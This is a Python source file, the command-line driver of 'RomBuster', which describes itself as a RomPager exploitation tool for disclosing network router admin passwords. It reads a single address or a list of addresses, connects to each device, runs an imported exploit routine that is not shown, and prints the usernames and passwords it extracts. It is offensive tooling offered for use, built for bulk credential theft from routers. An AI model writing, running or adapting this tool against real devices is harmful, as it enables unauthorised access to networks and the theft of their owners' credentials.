#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import argparse

from .exploit import Exploit
from .badges import Badges


class RomBusterCLI(Exploit, Badges):
    description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('--list', dest='list', help='Addresses list.')
    parser.add_argument('--address', dest='address', help='Address.')
    args = parser.parse_args()

    def hack(self, host):
        self.print_process(f"({host}) - connecting to device ...")
        response = self.connect(host)

        if response is not None:
            self.print_process(f"({host}) - accessing rom ...")
            creds = self.exploit(response)

            if creds is not None:
                self.print_process(f"({host}) - extracting credentials ...")
                for username in creds.keys():
                    self.print_information(f"({host}) - {username}:{creds[username]}")
            else:
                self.print_error(f"({host}) - rom access denied!")
        else:
            self.print_error(f"({host}) - connection rejected!")

    def start(self):
        if self.args.list:
            with open(self.args.list, 'r') as f:
                lines = f.read().strip().split('\n')
                for line in lines:
                    self.hack(line)
            for credential in self.credentials:
                self.print_success(credential)
        elif self.args.address:
            self.hack(self.args.address)
            for credential in self.credentials:
                self.print_information(credential)
        else:
            self.print_error("No list or address specified!")

def main():
    cli = RomBusterCLI()
    cli.start()
